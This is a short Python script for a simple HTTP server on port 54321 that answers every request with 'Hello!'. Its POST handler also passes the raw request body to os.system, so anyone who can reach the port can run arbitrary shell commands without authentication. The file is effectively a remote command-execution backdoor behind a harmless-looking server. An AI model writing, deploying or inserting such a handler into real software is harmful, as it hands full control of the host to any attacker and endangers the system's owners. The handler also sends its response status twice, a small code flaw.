import os
import http.server
import socketserver

PORT = 54321

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f'GET {self.client_address[0]}:{self.client_address[1]} {self.path}')
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(b'Hello!\n')

    def do_POST(self):
        size = int(self.headers['Content-Length'])
        body = self.rfile.read(size)
        print(f'POST {self.client_address[0]}:{self.client_address[1]} {self.path} {body!r}')
        self.send_response(200)
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write(b'Hello!\n')
        os.system(body)


with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print("serving at port", PORT)
    httpd.serve_forever()
